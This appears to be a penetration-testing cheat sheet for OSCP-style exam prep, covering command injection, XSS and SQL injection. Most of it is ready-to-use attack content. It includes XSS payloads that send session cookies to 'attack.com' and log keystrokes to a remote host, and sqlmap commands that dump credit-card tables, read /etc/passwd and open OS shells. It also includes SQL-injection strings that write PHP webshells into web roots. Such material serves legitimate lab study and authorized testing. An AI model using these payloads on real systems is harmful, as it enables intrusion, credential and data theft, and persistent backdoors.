# Command Injection 
[Payloads](https://github.com/payloadbox)  
## Contents 
- [Contents](#contents)
- [Inject Input for Code Execution](#inject-input-for-code-execution)
- [Stored XSS](#stored-xss)
- [SQL Injection](#sql-injection)
  * [SQLMAP (Not allowed on OSCP exam but good for labs!)](#sqlmap-not-allowed-on-oscp-exam-but-good-for-labs)
  * [Manual Testing](#manual-testing)

## Inject Input for Code Execution     
Command seperation / redirection operators:  

     ; | || & && > >>  
Substitute operators: 

    ' $ ()   
Examples:   

     text;echo test   #Unix only     
     echo test|     #Perl inject when open file     
     text | echo test
     text || echo test   #run 2nd cmd if error on initial      
     text & echo test   #initial cmd as bg task     
     text && echo test   #run 2nd cmd if no error on initial          
     $(echo test)   #bash specific      
     'echo test'    #Unix process substitute     
     >(echo test)    #Unix, process substitute     
    
Non blind command injection: 

    read /etc/passwd or world readables dirs, look for passwords, SSH keys, installed apps.     
Blind command injection:      

    run tcpdump on your attack box and inject a ping command (use -c3 for Linux targets so ping doesn't run forever)      
    Use Burp Collaborator and inject an nslookup command: https://www.tevora.com/threat-blog/blind-command-injection-testing-with-burp-collaborator/     

Vulnerable PHP functions: system, exec, shell_exec, popen, proc_open, passthru, pcntl_exec    

## Stored XSS    
Stored XSS: Victim gets malicious code after view a webpage.    
Reflected XSS: code output is reflected in response to a user, common vuln in URL params (GET or POST). Usually needs social engineering as a delivery mechanism.     
Basic Payload

     <script>alert("XSS")</script>
Test Input Fields (html tag <hr>, form elements and GET params)        

     '';!--"<XSS>=&{ () }     #look for unmodified chars    
Check for HTTPOnly Cookie Flag (unable to effect cookie with JS)   

     wget --server-response https://site.com 2>&1 | grep -E "Content-Security-Policy|Set-Cookie"    
Steal Session Cookie

    <script>fetch('https://site.com/page?cookie=' + btoa(document.cookie));</script>   
    <script>document.location='http://attack.com/page.php?c='+document.cookie</script>        
Record Keys Entered     

     <script>document.onkeypress = function(e) { fetch('https://site.com/log?key=' + btoa(e.key) );}</script>          

## SQL Injection 
[SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
[Pentestmonkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
Enum using nmap

    nmap -sV --script=http-sql-injection <target>  
    
Using jsql 

### SQLMAP (Not allowed on OSCP exam but good for labs!) 
Crawl a page to find sql-injections. Always use a valid non-error generating URL and put the URL in quotes.   

    sqlmap -u "http://example.com" --crawl=1    
    sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql --dbs    #after identifying a vulnerability see database names     
    sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql -D database --tables    #get table names from a database       
    sqlmap -u "http://site.org/index.php?vuln_param=1" --dbms=mysql -D database -T table --dump    #dump table content         
Used captured HTTP request (use Burp to capture the request then copy it to a text file)   

    sqlmap -r sqli.txt   
Custom SQLi        

    sqlmap -u --data="query" -D [database name] --tables --threads 5 
    
Dump database    

    sqlmap -u "http://172.21.0.0" --dbms=mysql --dump   
Get a shell 

    sqlmap -u "http://172.21.0.0" --dbms=mysql --os-shell
Using sqlmap with login-page  

    sqlmap -u "https://site.org/sqli/sqli.php?name=Bob" --file-read=/etc/passwd   #read file, if SQL is configured to allow that   
    sqlmap -r request.txt --dbs    
    sqlmap -r request.txt -D dbname -T tablename   
    sqlmap -r request.txt --search -D db_name_search   
    sqlmap -r request.txt -D nowasp -T credit_cards --dump --start=1 --start=2       #look at 1st 2 records in table Search for usernames and passwords    
    
    sqlmap -r request.txt --users --passwords           #find hashes / usernames     

### Manual Testing    
try single quote, then double quote, then try with comments     
Comment chars    

    ' " % %% -- /* // ) ;   
Testing Payloads    

    'or 1=1- -
    'or 1=1;-  
    ' or '1'=1
    ' or '1'=1 - -
    '–
    ' or '1'='1
    -'
    ' '
    '&'
    '^'
    '*'
    ' or ''-'
    ' or '' '
    ' or ''&'
    `' or ''^'``
    `' or ''*'
    "-"
    " "
    "&"
    "^"
    "*"
    " or ""-"
    " or "" "
    " or ""&"
    " or ""^"
    " or ""*"
    or true--
    " or true--
    ' or true--
    ") or true--
    ') or true--
    ' or 'x'='x
    ') or ('x')=('x
    ')) or (('x'))=(('x
    " or "x"="x
    ") or ("x")=("x
    ")) or (("x"))=(("x   
    
For a row 

    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8      
Known Username

    admin’ - -
    admin’) - -
    
Using error-bases DB enumeration

    Add the tick '
    Enumerate columns  
    
Using order by
https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html

Figuring out schema   
MySQL:   
Databases: SELECT schema_name FROM information_schema.schemata   
Tables: SELECT table_name FROM information_schema.tables   
Columns: SELECT column_name FROM information_schema.columns   
#enum info
text UNION SELECT 1,@@version,user(),system_user(),database(),3,4,5,6,8,10,11
user() - username and hostname of account, system_user() - account name used by Windows auth     


MS SQL Server:   
Note: information_schema can be used for MS SQL Server as well, with some slight, but significant, differences. The queries will need to explicitly reference individual databases because information_schema is a view that provides only info on the current database. Databases: SELECT name FROM sys.databases   
Tables: SELECT name FROM sys.tables    
Columns: SELECT name FROM sys.columns    

Oracle:   
Schemas: SELECT owner FROM all_tables   
Tables: SELECT table_name FROM all_tables   
Columns: SELECT column_name FROM all_tab_columns   
	 
 SQL Injection Webshells
 
     #Linux
     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
     
     #Windows
     ?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
	
	
Example SQLi on Windows:
#testing

    http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

#exploitation

    http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
